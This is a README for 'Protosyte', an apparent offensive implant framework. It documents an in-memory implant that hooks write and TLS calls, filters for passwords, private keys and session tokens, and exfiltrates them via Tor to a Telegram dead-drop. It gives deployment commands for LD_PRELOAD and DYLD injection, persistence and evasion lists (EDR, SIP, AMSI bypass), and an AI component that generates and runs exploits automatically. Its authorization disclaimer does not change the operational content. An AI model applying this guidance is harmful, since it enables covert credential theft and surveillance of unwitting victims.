# Protosyte Framework
## Version 2.1 - "Virtualized Observer"

**⚠️ CRITICAL DISCLAIMER**: This framework is designed for **authorized penetration testing, security research, and red team exercises only**. Unauthorized use is illegal and unethical. Always obtain explicit written authorization before use.

---

## Table of Contents

1. [Concept & Philosophy](#concept--philosophy)
2. [Architecture Overview](#architecture-overview)
3. [Quick Start](#quick-start)
4. [Complete Usage Examples](#complete-usage-examples)
5. [Component Details](#component-details)
6. [Advanced Features](#advanced-features)
7. [Platform Support](#platform-support)
8. [Security & Legal](#security--legal)
9. [Reference Documentation](#reference-documentation)

---

## Concept & Philosophy

### What is Protosyte?

Protosyte is a **non-attributable, passive Cyber Threat Intelligence (CTI) collection framework** engineered for forensic stealth and operational security. It operates on the principle of **Unidirectional Passive Observation (UPO)**: intelligence flows outward from a target via its own systems, while zero commands, queries, or active signatures ever flow back.

**It is NOT traditional malware** - it is a "ghost in the signal" that uses the target's infrastructure as its substrate and ephemeral cloud services as its broadcast medium.

### Core Philosophy: Unidirectional Passive Observation (UPO)

- **Intelligence flows OUT** from the target
- **ZERO commands flow back** to the target
- Uses the target's own infrastructure
- No persistent infrastructure required
- Memory-only operation
- Stateless dead-drop communication

### Foundational Tenets

1. **Zero Infrastructure**: Operates no persistent servers, domains, or endpoints
2. **Zero Interaction**: Never actively interacts with, scans, or exploits the target post-implantation
3. **Memory-Only Implant**: Critical component exists solely in volatile memory
4. **Public Broadcast Exfiltration**: Data egress via legitimate outbound traffic to trusted third-party services (Telegram)
5. **Virtualized, Disposable Analysis**: Intelligence processing in transient VMs destroyed after each session
6. **Forensic Stealth**: Maximum operational security and attribution resistance

### Language Strategy: Rust/Go Hybrid

**Rust** (Component A - Silent Seed):
- Zero-cost abstractions, deterministic resource management
- No runtime overhead
- Ideal for low-footprint, forensic-stealth implants
- Low-level system hooking capabilities

**Go** (Components B, C, D, E):
- Superior standard library, built-in concurrency
- Rapid development cycle
- Perfect for network services and data pipelines
- Disposable single-use tools

---

## Architecture Overview

### System Components

```
[ TARGET ENVIRONMENT ]
        |
        | (1. Passive Data Capture via Memory Hook)
        V
  [A: SILENT SEED] (Rust - In-Memory Implant)
        |
        | (2. Protobuf Serialization -> LZ4 -> AES-GCM)
        | (3. Exfiltration via Local Tor Proxy)
        V
  [B: BROADCAST ENGINE] (Go - Telegram Bot API)
        ^
        | (4. Timed Polling via Tor)
        |
[C: ANALYSIS RIG VM] (Go - Ephemeral Virtual Machine)
        |
        | (5. Analyst Dashboard & FIP Generation)
        V
[HOST OPS STATION] (Management & FIP Retrieval)
        |
        | (6. Physical Transfer)
        V
  [D: LEGAL BRIDGE] (Go - One-Time Terminal)

[E: AI INTEGRATION] (Go - Optional, for Initial Access)

[F: ADAPTIXC2 BRIDGE] (Go - Optional, Hybrid Active/Passive Model)

```

### Data Flow

1. **Passive Capture**: Silent Seed hooks system calls (fwrite, send, SSL_write)
2. **Filtering**: Data filtered through regex patterns for sensitive information
3. **Encryption**: AES-GCM encryption with host binding
4. **Compression**: LZ4 compression before encryption
5. **Exfiltration**: Encrypted payloads sent via Tor to Telegram Bot API
6. **Broadcast**: Telegram bot receives and immediately deletes messages (stateless dead-drop)
7. **Retrieval**: Analysis Rig retrieves payloads from Telegram via Tor
8. **Analysis**: Decryption, decompression, parsing, and storage in SQLite
9. **Dashboard**: Web interface for analyst review
10. **FIP Generation**: Forensic Intelligence Packet generation for reporting

---

## Quick Start

### Prerequisites

**System Requirements**:
- Linux, Windows, or macOS
- Rust 1.70+ (for Silent Seed)
- Go 1.24+ (for other components)
- Tor (for exfiltration)
- Telegram Bot Token

**Optional**:
- Ollama (for AI integration)
- VirtualBox/VMware (for Analysis Rig VM)

### Installation

1. **Clone Repository**:
```bash
git clone <repository-url>
cd Protosyte
```

2. **Set Up Telegram Bot**:
   - Open Telegram, search for `@BotFather`
   - Send `/newbot` and follow instructions
   - Save the bot token
   - Configure: `/setjoingroups` → Disabled, `/setprivacy` → Enabled

3. **Configure Environment**:
```bash
# Copy example configuration
cp mission.yaml.example mission.yaml

# Edit with your parameters
nano mission.yaml

# Set environment variables
export PROTOSYTE_BOT_TOKEN="your_bot_token"
export PROTOSYTE_PASSPHRASE="your_secure_passphrase"
```

4. **Build All Components**:
```bash
# Build everything
make all

# Or build individually
make build-seed          # Linux Silent Seed
make build-windows-seed  # Windows Silent Seed
make build-macos-seed    # macOS Silent Seed
make build-broadcast     # Broadcast Engine
make build-analysis      # Analysis Rig
make build-bridge        # Legal Bridge
```

---

## Complete Usage Examples

### Example 1: Basic Linux Deployment

**Step 1: Build Silent Seed**
```bash
cd protosyte-seed
cargo build --release --target x86_64-unknown-linux-gnu
```

**Step 2: Configure Mission**
```yaml
# mission.yaml
mission:
  id: 0xDEADBEEFCAFEBABE
  name: "Operation Example"
  
target:
  hooks:
    - "fwrite"
    - "send"
    - "SSL_write"
  filters:
    - pattern: "password|passwd|pwd"
      type: "CREDENTIAL_BLOB"
    - pattern: "-----BEGIN.*PRIVATE KEY-----"
      type: "CREDENTIAL_BLOB"
    - pattern: "JSESSIONID"
      type: "SESSION_TOKEN"
  
exfiltration:

adaptixc2:
  enabled: true
  auto_deploy_protosyte: true

  interval_seconds: 347
  jitter_percent: 25
  tor_proxy: "socks5://127.0.0.1:9050"
```

**Step 3: Deploy Silent Seed**
```bash
# Method 1: LD_PRELOAD (requires access to target)
export LD_PRELOAD=/path/to/libprotosyte.so
/path/to/target_application

# Method 2: Inject into existing process (requires privileges)
# See: protosyte-seed/README.md for detailed injection methods
```

**Step 4: Start Broadcast Engine**
```bash
cd broadcast-engine
export PROTOSYTE_BOT_TOKEN="your_token"
go run main.go
# Or deploy to ephemeral cloud (Fly.io, Render, etc.)
```

**Step 5: Set Up Analysis Rig VM**
```bash
# Create VM with two network adapters:
# - Adapter 1: NAT/Bridged (WAN) - disabled by default
# - Adapter 2: Host-only - static IP 192.168.56.10

# Install base OS, Go, Tor in VM
# Copy protosyte-rig binary to VM
# Create baseline snapshot
```

**Step 6: Retrieve and Analyze**
```bash
# In VM: Enable WAN adapter, retrieve payloads
torsocks ./protosyte-rig --mode retrieve --token-env PROTOSYTE_BOT_TOKEN

# Disable WAN adapter, analyze payloads
./protosyte-rig --mode analyze --passphrase-fd 3 3< <(echo "$PASSPHRASE")

# Access dashboard from host: http://192.168.56.10:8080
```

**Step 7: Generate FIP**
```bash
# Via dashboard: Click "Generate FIP"
# Or via command line in VM
./protosyte-rig --mode fip --output /tmp/rig_out/

# Transfer FIP to host
scp user@192.168.56.10:/tmp/rig_out/forensic_intel_packet.json.gz ./
```

### Example 2: AI-Driven Initial Access

**Step 1: Install Ollama**
```bash
curl -fsSL https://ollama.com/install.sh | sh
ollama pull llama3.2
```

**Step 2: Run AI Analysis**
```bash
cd protosyte-ai
go run ollama_integration.go
```

**Step 3: AI Workflow**
```go
// AI automatically:
// 1. Analyzes target reconnaissance data
// 2. Searches for CVEs (NVD, MITRE, Exploit-DB, GitHub)
// 3. Generates exploit payloads
// 4. Attempts automated exploitation
// 5. Reports successful access vectors

// Example output:
// Searching for CVEs related to Apache 2.4.62...
// Found 8 CVEs: [CVE-2024-42516, CVE-2024-43204, ...]
// 
// Researching CVE: CVE-2024-42516...
// NVD: Severity: MODERATE (CVSS: 5.3)
// Exploit-DB: Found 1 exploits
// GitHub POCs: 3 repositories found (requires approval)
// 
// AI-Generated Exploit:
// curl -H "Content-Type: text/html\r\n\r\n..." https://target/vulnerable-endpoint
```

**Step 4: Deploy After Initial Access**
```bash
# After AI achieves initial access, deploy Silent Seed
# See Example 1, Step 3
```

### Example 3: Windows Deployment

**Step 1: Build Windows Silent Seed**
```bash
cd protosyte-seed-windows
cargo build --release --target x86_64-pc-windows-msvc
```

**Step 2: Deploy via DLL Injection**
```bash
# Method 1: SetWindowsHookEx (no admin needed)
# See: protosyte-seed-windows/README.md

# Method 2: Classic DLL Injection (requires SeDebugPrivilege)
# See: protosyte-seed-windows/src/injection.rs

# Method 3: Process Hollowing (advanced)
# See: protosyte-seed-windows/src/injection.rs
```

**Step 3: Configure Tor Detection**
```bash
# Automatic Tor port detection (9050 or 9150)
# Or manually configure in mission.yaml
```

### Example 4: macOS Deployment

**Step 1: Build macOS Silent Seed**
```bash
cd protosyte-seed-macos
cargo build --release --target x86_64-apple-darwin
```

**Step 2: Deploy via DYLD Injection**
```bash
# Method 1: DYLD_INSERT_LIBRARIES (user space, no SIP bypass needed)
DYLD_INSERT_LIBRARIES=/path/to/libprotosyte.dylib /path/to/app

# Method 2: LaunchAgent (persistence)
# See: protosyte-seed-macos/README.md

# Method 3: Function Interposing (more stealthy)
# See: protosyte-seed-macos/src/injection.rs
```

### Example 5: Complete Campaign Workflow

**Phase 1: Reconnaissance**
```bash
# Port scan target
nmap -sV -p- target-ip

# Web application enumeration
gobuster dir -u https://target-ip -w wordlist.txt

# Technology stack analysis
whatweb https://target-ip
```

**Phase 2: AI-Driven Initial Access (Optional)**
```bash
cd protosyte-ai
go run ollama_integration.go
# AI analyzes target, finds CVEs, generates exploits
```

**Phase 3: Implantation**
```bash
# Deploy Silent Seed based on target OS
# Linux: LD_PRELOAD or eBPF
# Windows: DLL injection
# macOS: DYLD_INSERT_LIBRARIES
```

**Phase 4: Collection**
```bash
# Silent Seed automatically:
# - Hooks system calls
# - Filters sensitive data
# - Encrypts and compresses
# - Exfiltrates via Tor to Telegram
# No operator interaction needed
```

**Phase 5: Analysis**
```bash
# Start Broadcast Engine (if not already running)
cd broadcast-engine
go run main.go

# In Analysis Rig VM:
# 1. Enable WAN, retrieve payloads
torsocks ./protosyte-rig --mode retrieve

# 2. Disable WAN, analyze
./protosyte-rig --mode analyze

# 3. Access dashboard
# http://192.168.56.10:8080
```

**Phase 6: Reporting**
```bash
# Generate FIP via dashboard
# Transfer to host
# Submit via Legal Bridge (if applicable)
cd legal-bridge
export LE_PORTAL_URL="https://portal.example/submit"
export LE_PORTAL_KEY="your_key"
./protosyte-bridge
```

---

## Component Details

### Component A: Silent Seed (Rust)

**Purpose**: Passive, in-memory data capture and exfiltration

**Platforms**: Linux, Windows, macOS

**Key Features**:
- Memory-only operation (no file writes)
- System call hooking (fwrite, send, SSL_write)
- Pattern-based data filtering
- AES-GCM encryption with host binding
- LZ4 compression
- Tor-based exfiltration
- Evasion techniques

**Detailed Documentation**: See `protosyte-seed/README.md`, `protosyte-seed-windows/README.md`, `protosyte-seed-macos/README.md`

### Component B: Broadcast Engine (Go)

**Purpose**: Stateless dead-drop via Telegram Bot API

**Key Features**:
- Receives encrypted payloads from Silent Seed
- Auto-deletes messages after receipt (30 seconds)
- No persistent storage
- Tor-enabled for anonymity

**Detailed Documentation**: See `broadcast-engine/README.md`

### Component C: Analysis Rig (Go)

**Purpose**: Ephemeral VM-based intelligence analysis

**Key Features**:
- Retrieves payloads from Telegram
- Decrypts and decompresses data
- Parses Protobuf envelopes
- Stores intelligence in SQLite
- Web dashboard for analyst review
- FIP (Forensic Intelligence Packet) generation
- VM destroyed after each session

**Detailed Documentation**: See `analysis-rig/README.md`

### Component D: Legal Bridge (Go)

**Purpose**: One-time submission tool for law enforcement

**Key Features**:
- Formats intelligence as FIP
- Submits to law enforcement portal
- Self-destructs after execution
- Physical transfer capability

**Detailed Documentation**: See `legal-bridge/README.md`

### Component E: AI Integration (Go) - Optional

**Purpose**: AI-driven initial access automation

**Key Features**:
- Ollama AI integration for target analysis
- CVE research and lookup (NVD, MITRE, Exploit-DB, GitHub)
- Automated exploit generation
- Social engineering content generation
- GitHub download approval system

**Detailed Documentation**: See `protosyte-ai/README.md`

### Component F: AdaptixC2 Integration (Go) - Optional

**Purpose**: Hybrid active/passive model combining active C2 with passive collection

**Key Features**:
- Automatic Protosyte deployment via AdaptixC2 agents
- Intelligence feed to AdaptixC2 operators
- Active/passive phase management
- Multi-platform support (Linux, Windows, macOS)
- Seamless integration with mission.yaml configuration

**Detailed Documentation**: See `protosyte-adaptixc2/README.md`


---

## Advanced Features

### Evasion Techniques (2025)

**Windows**:
- Hell's Gate / Halo's Gate (syscall unhooking)
- Thread Stack Spoofing
- Module Stomping
- Callback Hell (EDR callback removal)
- Process Ghosting
- Early Bird Injection
- Manual DLL Mapping

**macOS**:
- Dynamic Code Mutation
- Advanced SIP Bypass
- TCC Bypass
- Notarization Bypass
- Advanced Anti-Debugging
- Advanced XProtect Bypass

**Linux**:
- eBPF-Based Evasion
- Kernel Module Rootkit Techniques
- SELinux/AppArmor Bypass
- Proc Hiding
- Network Evasion

**Cross-Platform**:
- Quantum-Resistant Obfuscation
- AI-Driven Pattern Evasion
- Polymorphic Code Generation
- Metamorphic Engine

**Detailed Documentation**: See `ADVANCED_EVASION_2025.md`

### Platform-Specific Techniques

**Linux**: LD_PRELOAD, ptrace, eBPF, systemd services  
**Windows**: DLL injection, process hollowing, Windows services, registry  
**macOS**: DYLD_INSERT_LIBRARIES, LaunchAgents, SIP bypass

**Detailed Documentation**: See `OFFENSIVE_TECHNIQUES.md`

---

## Platform Support

### Linux

**Injection Methods**: LD_PRELOAD, ptrace, eBPF  
**Persistence**: systemd services, cron jobs, .bashrc/.profile  
**Stealth**: eBPF hiding, Proc hiding, SELinux/AppArmor bypass

### Windows

**Injection Methods**: DLL injection, Process hollowing, Reflective injection, SetWindowsHookEx, COM hijacking  
**Persistence**: Windows services, Registry (AppInit_DLLs), Scheduled tasks  
**Stealth**: PEB manipulation, Process unlinking, Direct syscalls, AMSI bypass, ETW patching

### macOS

**Injection Methods**: DYLD_INSERT_LIBRARIES, Function interposing, Memory injection, LaunchAgent/LaunchDaemon  
**Persistence**: LaunchAgents (user), LaunchDaemons (root), Login items  
**Stealth**: SIP bypass, Gatekeeper bypass, XProtect bypass, TCC bypass, Anti-debugging

---

## Security & Legal

### ⚠️ CRITICAL WARNINGS

**This framework is for**:
- ✅ Authorized penetration testing
- ✅ Legitimate security research
- ✅ Red team exercises with proper scope
- ✅ Educational purposes in controlled environments

**NEVER use for**:
- ❌ Unauthorized access
- ❌ Malicious purposes
- ❌ Espionage
- ❌ Data theft
- ❌ Any illegal activity

### Legal Requirements

1. **Explicit Written Authorization**: Must have written permission from target organization
2. **Scope Definition**: Clear boundaries of what can be tested
3. **Rules of Engagement**: Documented and agreed upon
4. **Compliance**: Follow all local and international laws
5. **Responsible Disclosure**: Report findings responsibly

### Operational Security

- All traffic through Tor
- Memory-only operation
- Stateless communication
- Ephemeral analysis environments
- No persistent infrastructure
- Evasion techniques

### Responsible Use

- Review all AI-generated payloads before execution
- Validate exploit code before execution
- Use in isolated testing environments
- Maintain detailed logs
- Follow responsible disclosure practices

---

## Reference Documentation

### Component-Specific Documentation

- **`protosyte-seed/README.md`**: Linux Silent Seed details
- **`protosyte-seed-windows/README.md`**: Windows Silent Seed details
- **`protosyte-seed-macos/README.md`**: macOS Silent Seed details
- **`broadcast-engine/README.md`**: Broadcast Engine details
- **`analysis-rig/README.md`**: Analysis Rig details
- **`legal-bridge/README.md`**: Legal Bridge details
- **`protosyte-adaptixc2/README.md`**: AdaptixC2 integration details
- **`protosyte-ai/README.md`**: AI integration details

### Advanced Reference Documentation

- **`ADVANCED_EVASION_2025.md`**: Detailed evasion techniques
- **`OFFENSIVE_TECHNIQUES.md`**: Platform-specific offensive techniques
- **`APACHE_VULNERABILITY_ANALYSIS.md`**: Apache vulnerability research example
- **`HYPOTHETICAL_CAMPAIGN_EXAMPLE.md`**: Complete campaign scenario example

### External Resources

- [Apache Security Advisory](https://httpd.apache.org/security/vulnerabilities_24.html)
- [NVD (National Vulnerability Database)](https://nvd.nist.gov/)
- [MITRE CVE Database](https://cve.mitre.org/)
- [Exploit-DB](https://www.exploit-db.com/)
- [Ollama Documentation](https://ollama.com/docs)

---

## Project Structure

```
Protosyte/
├── protosyte-seed/          # Linux Silent Seed (Rust)
├── protosyte-seed-windows/  # Windows Silent Seed (Rust)
├── protosyte-seed-macos/    # macOS Silent Seed (Rust)
├── broadcast-engine/        # Telegram Bot (Go)
├── analysis-rig/            # Analysis VM (Go)
├── legal-bridge/            # FIP Submission (Go)
├── protosyte-ai/           # AI Integration (Go)
├── proto/                  # Protobuf schemas
├── scripts/                 # Build and utility scripts
├── mission.yaml.example    # Configuration template
└── README.md                # This file
```

---

## Configuration

### mission.yaml Structure

```yaml
mission:
  id: 0xDEADBEEFCAFEBABE  # Unique mission identifier
  name: "Operation Name"

adaptixc2:
  enabled: true
  auto_deploy_protosyte: true

  
target:
  ip: "target-ip"
  hostname: "target-hostname"
  os: "linux|windows|macos"
  hooks:
    - "fwrite"
    - "send"
    - "SSL_write"
  filters:
    - pattern: "password|passwd|pwd"
      type: "CREDENTIAL_BLOB"
    - pattern: "-----BEGIN.*PRIVATE KEY-----"
      type: "CREDENTIAL_BLOB"
    - pattern: "JSESSIONID"
      type: "SESSION_TOKEN"
    
exfiltration:
  telegram_token: "[obfuscated]"  # Set via environment variable
  chat_id: "[chat_id]"
  tor_proxy: "socks5://127.0.0.1:9050"
  interval_seconds: 347
  jitter_percent: 25
  
stealth:
  memory_only: true
  hide_from_proc: true
  use_tor: true
  timing_jitter: true
```

### Environment Variables

```bash
# Required
export PROTOSYTE_BOT_TOKEN="your_bot_token"
export PROTOSYTE_PASSPHRASE="your_secure_passphrase"

# Optional (for AI integration)
export OLLAMA_HOST="http://localhost:11434"
export OLLAMA_MODEL="llama3.2"

# Optional (for Legal Bridge)
export LE_PORTAL_URL="https://portal.example/submit"
export LE_PORTAL_KEY="your_submission_key"
```

---

## Troubleshooting

### Silent Seed Not Capturing Data

- Verify hooks are correctly configured
- Check filter patterns match target data
- Ensure Tor proxy is accessible
- Verify Telegram bot token is correct
- Check system call hooking is working

### Broadcast Engine Not Receiving Messages

- Verify bot token is correct
- Check bot privacy settings
- Ensure bot is running and accessible
- Verify network connectivity

### Analysis Rig Cannot Retrieve Payloads

- Verify WAN adapter is enabled during retrieval
- Check Tor is running and accessible
- Verify bot token is correct
- Ensure messages haven't been deleted (30-second window)

### Dashboard Not Accessible

- Verify host-only network is configured correctly
- Check VM IP is 192.168.56.10
- Ensure dashboard port 8080 is not blocked
- Verify analysis mode completed successfully

---

## Version History

**Version 2.1 - "Virtualized Observer"**:
- Evasion techniques
- Multi-platform support (Linux, Windows, macOS)
- AI integration for initial access
- Quantum-resistant obfuscation
- Enhanced stealth capabilities
- CVE research and lookup
- GitHub download approval system

---

## License

This framework is provided for **authorized security research and penetration testing only**. Use is subject to applicable laws and regulations. The authors assume no liability for misuse.

---

## Support

For detailed information:
- **Component-specific details**: See component README files
- **Techniques**: See `ADVANCED_EVASION_2025.md` and `OFFENSIVE_TECHNIQUES.md`
- **Example scenarios**: See `HYPOTHETICAL_CAMPAIGN_EXAMPLE.md`
- **Vulnerability research**: See `APACHE_VULNERABILITY_ANALYSIS.md`

---

**Last Updated**: 2025-12-03  
**Purpose**: Authorized Security Research & Penetration Testing  
**Classification**: Research Tool - Requires Explicit Authorization
